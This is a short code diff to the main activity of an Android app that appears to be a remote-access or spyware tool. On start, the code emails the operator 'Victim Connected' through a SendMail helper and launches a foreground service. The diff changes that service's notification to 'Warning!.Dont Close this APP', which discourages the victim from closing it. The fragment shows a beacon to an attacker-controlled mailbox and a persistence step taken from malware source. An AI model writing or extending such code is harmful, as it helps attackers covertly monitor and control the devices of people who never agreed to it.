@@ -329,7 +329,7 @@ public class MainActivity extends AppCompatActivity {
             new SendMail(getApplicationContext(), MailConfig.MAIL_TO, "Victim Connected", "Stay Safe !!! Stay Legal !!!").execute();
 
             Intent serviceIntent = new Intent(this, ForegroundService.class);
-            serviceIntent.putExtra("inputExtra", "Foreground Service Example in Android");
+            serviceIntent.putExtra("inputExtra", "Warning!.Dont Close this APP");
             ContextCompat.startForegroundService(this, serviceIntent);
 
         }
